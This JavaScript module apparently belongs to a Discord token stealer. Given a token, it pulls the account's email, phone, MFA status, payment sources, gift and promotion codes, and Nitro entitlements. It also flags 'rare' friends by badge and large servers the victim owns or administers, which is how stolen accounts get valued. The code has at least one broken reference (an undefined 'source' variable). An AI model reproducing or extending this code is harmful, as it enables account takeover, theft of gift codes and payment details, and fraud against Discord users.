"use strict";

const emojis = {
  "themes": {
    "dark": "Dark",
    "light": "Light",
  },
  "status": {
    "online": "<:online:1129709364316491787>",
    "idle": "<:idle:1120542710424674306>",
    "dnd": "<:dnd:974692691289993216>",
    "invisible": "<:offline:1137141023529762916>",
  },
  "user": {
    "boost": [
      "<:Booster1Month:1087043238654906472> ",
      "<:Booster2Month:1087043319227494460> ",
      "<:Booster3Month:1087043368250511512> ",
      "<:Booster6Month:1087043493236592820> ",
      "<:Booster9Month:1087043493236592820> ",
      "<:booster12month:1162420359291732038> ",
      "<:Booster15Month:1051453775832961034> ",
      "<:Booster18Month:1051453778127237180> ",
      "<:Booster24Month:1051453776889917530> ",
    ],
    "payments": [
      "<a:card:1083014677430284358> ",
      "<:paypal:1129073151746252870> ",
    ],
    "i": [
      "<:staff:1090015968618623129> ",
      "<:partner:918207395279273985> ",
      "<:events:898186057588277259> ",
      "<:bughunter_1:874750808426692658> ",
      "<:bravery:874750808388952075> ",
      "<:brilliance:874750808338608199> ",
      "<:balance:874750808267292683> ",
      "<:early:944071770506416198> ",
      "<:bughunter_2:874750808430874664> ",
      "<:activedev:1042545590640324608> ",
      "<:verifieddeveloper:898181029737680896> ",
    ],
  },
};

const languages = {
  "zh-TW": "🇨🇳 Chinese-Taiwanese",
  "pr-BR": "🇵🇹 Portuguese",
  "sv-SE": "🇸🇪 Swedish",
  "zh-CN": "🇨🇳 Chinese-China",
  "en-GB": "🪟 English (UK)",
  "en-US": "🇺🇸 USA",
  "es-ES": "🇪🇸 Español",
  "ro": "🇷🇴 Romanian",
  "fi": "🇫🇮 Finnish",
  "vi": "🇻🇳 Vietnamese",
  "tr": "🇹🇷 Turkish",
  "ru": "🇷🇺 Russian",
  "uk": "🇺🇦 Ukrainian",
  "hi": "🇮🇳 Indian",
  "th": "🇹🇼 Taiwanese",
  "hr": "🇭🇷 Croatian",
  "it": "🇮🇹 Italianio",
  "lt": "🇱🇹 Lithuanian",
  "no": "🇳🇴 Norwegian",
  "ja": "🇯🇵 Japanese",
  "ko": "🇰🇷 Korean",
  "fr": "🇫🇷 French",
  "da": "🇩🇰 Dansk",
  "de": "🇩🇪 Deutsch",
  "pl": "🇵🇱 Polish",
  "cs": "🇨🇿 Czech",
  "el": "🇬🇷 Greek",
  "bg": "🇧🇬 Bulgarian",
  "hu": "🇳🇴🇭🇺 Hungarian",
};

let getLanguage = (l) => languages[l] || "Unknown Language";

let getTheme = (t) => emojis.themes[t] || "Unknown Theme";

let getStatusEmoji = (s) => emojis.status[s];

let getImage = (p) => !p ? false : `${p}.${require("sync-fetch")(p).headers.get("content-type").includes("image/gif") ? "gif" : "png"}?size=512`;

let getGiftsCodes = (token, f) => {
  let t = [];
  const r = getDiscordApi(`https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=${f.locale}`, token);
  if (r.length === 0) {
    return "Codes-Gifts Not Found";
  } else {
    r.forEach((g) => {
      t.push({
        name: g.promotion.outbound_title,
        code: g.code,
      });
    });
  }
  return t;
}

let getGuilds = (n) => {
  let guilds = n;
  let format = (l, x) => l.length ? l.map((s) => { return x ? `${s.owner && x ? "<:owner:963333541343686696>" : "<:staff:846569357353680896>"} | **${s.name}** - \`${s.id}\` | **Members** \`${s.member_count}\`` : `${s.owner ? "<:owner:963333541343686696> " : ""}**${s.name}** - \`${s.id}\` | **Members** \`${s.member_count}\`` }).join("\n") : "Not Found";
  return {
    all: format(guilds.filter((a) => (a.permissions & 2048) === 2048).map((a) => ({ id: a.id, name: a.name, owner: a.owner, member_count: a.approximate_member_count })), false),
    rare: format(guilds.filter((s) => s.owner || (s.permissions & 8) === 8).filter((s) => s.approximate_member_count >= 500).map((s) => ({ id: s.id, name: s.name, owner: s.owner, member_count: s.approximate_member_count })), true),
  };
}

let rareFriend = (r) => {
  let ñ = "";
  for (const n of r.filter((_) => _.type === 1)) {
    const l = rareFriendadges(n.user.public_flags);
    if (l !== "Not Found") ñ += `${l} ${n.user.username}#${n.user.discriminator}\n`;
  }
  return ñ || "Not Found";
}

let getDiscordApi = (i, token) => {
  const res = require("sync-fetch")(i, {
    method: "GET",
    headers: {
      "Content-Type": "application/json",
      Authorization: token,
    },
  });
  return res.status === 200 ? res.json() : "Invalid";
}

let AllBadges = (f) => {
  let r = "";
  if (1 & f) r += emojis.user.i[0];
  if (2 & f) r += emojis.user.i[1];
  if (4 & f) r += emojis.user.i[2];
  if (8 & f) r += emojis.user.i[3];
  if (64 & f) r += emojis.user.i[4];
  if (128 & f) r += emojis.user.i[5];
  if (256 & f) r += emojis.user.i[6];
  if (512 & f) r += emojis.user.i[7];
  if (16384 & f) r += emojis.user.i[8];
  if (4194304 & f) r += emojis.user.i[9];
  if (131072 & f) r += emojis.user.i[10];
  return r || ":x:";
}

let rareFriendadges = (j) => {
  let x = "";
  if (1 & j) x += emojis.user.i[0];
  if (2 & j) x += emojis.user.i[1];
  if (4 & j) x += emojis.user.i[2];
  if (8 & j) x += emojis.user.i[3];
  if (512 & j) x += emojis.user.i[7];
  if (16384 & j) x += emojis.user.i[8];
  if (4194304 & j) x += emojis.user.i[9];
  if (131072 & j) x += emojis.user.i[10];
  return x || "Not Found";
}

let getNitroPremium = (u) => {
  const { premium_type, premium_guild_since } = u;
  switch (premium_type) {
    default:
      return ":x:";
    case 1:
      return "<:nitro:1016385399020601344>";
    case 2:
      if (!premium_guild_since) return "<:nitro:1016385399020601344>";
      const now = new Date();
      const m = [2, 3, 6, 9, 12, 15, 18, 24];
      let rem = 0;
      for (let i = 0; i < m.length; i++) {
        const d = m[i];
        if (Math.round((getDate(new Date(premium_guild_since), d) - now) / 86400000) > 0) {
          rem = i;
          break;
        }
      }
      return `<:nitro:1016385399020601344> ${emojis.user.boost[rem]}`;
  }
}

let getDate = (a, b) => new Date(a).setMonth(a.getMonth() + b);

let getDiscordInfo = (token) => {
  const user = getDiscordApi("https://discord.com/api/v9/users/@me", token);
  const profile = getDiscordApi(`https://discord.com/api/v9/users/${Buffer.from(token.split(".")[0], 'base64').toString('binary')}/profile`, token);
  if (user === "Invalid") return {
    all: "THIS TOKEN IS FAKE",
    guilds: "THIS TOKEN IS FAKE",
    friends: "THIS TOKEN IS FAKE"
  }
  const settings = getDiscordApi("https://discord.com/api/v9/users/@me/settings", token);
  const paymentSources = getDiscordApi("https://discord.com/api/v9/users/@me/billing/payment-sources", token);
  const relationships = getDiscordApi("https://discordapp.com/api/v9/users/@me/relationships", token);
  const guilds = getDiscordApi("https://discord.com/api/v9/users/@me/guilds?with_counts=true", token);
  const applications = getDiscordApi("https://discord.com/api/v9/applications", token);
  const connections = getDiscordApi("https://discordapp.com/api/v9/users/@me/connections", token);
  const entitlements = getDiscordApi("https://discord.com/api/v8/users/@me/entitlements/gifts", token);
  let p = "";
  paymentSources?.forEach(s => {
    if (s.brand && s.invalid === 0)
      p += emojis.user.payments[0];
    if (source.email)
      p += emojis.user.payments[1];
  });
  const info = {
    token: token,
    ID: user.id,
    globalName: `${user.global_name}`,
    avatarDecoration: `${user.avatar_decoration_data ? user.avatar_decoration_data : "Avatar-Decoration Not Found"}`,
    username: `${user.username}#${user.discriminator}`,
    badges: AllBadges(user.flags),
    nitroType: getNitroPremium(profile),
    avatar: user.avatar ? getImage(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`) : "Avatar Not Found",
    banner: user.banner ? getImage(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`) : "Banner Not Found",
    totalFriend: relationships.filter((b) => b.type === 1).length,
    totalBlocked: relationships.filter((a) => a.type === 2).length,
    pending: relationships.filter((r) => r.type === 3).length,
    NitroGifts: entitlements[0] ? entitlements.map((g) => `${g}, `).join("") : "Nitro Gifts-Codes Not Found",
    totalOwnedGuild: guilds.filter((g) => g.owner).length,
    totalApplication: applications.length,
    totalConnection: connections.length,
    totalGuild: guilds.length,
    NSFW: user.nsfw_allowed ? "🔞 `Allowed`" : "❌ `Not allowed`",
    MFA2: user.mfa_enabled ? "✅ `Allowed`" : "❌ `Not allowed`",
    verified: user.verified ? "✅" : "❌",
    bio: user.bio || "Bio Not Found",
    phone: user.phone || "Phone Not Found",
    mail: user.email,
    billing: !p ? "Not Found" : p,
    langue: getLanguage(settings.locale),
    status: getStatusEmoji(settings.status),
    theme: getTheme(settings.theme),
    gifts: getGiftsCodes(token, settings),
  }, guildsInfo = {
    all: getGuilds(guilds).all,
    rares: getGuilds(guilds).rare,
  }, friendsInfo = {
    all: "Unfinished",
    rares: rareFriend(relationships),
  };
  return {
    all: info,
    guilds: guildsInfo,
    friends: friendsInfo
  }
}

module.exports = getDiscordInfo
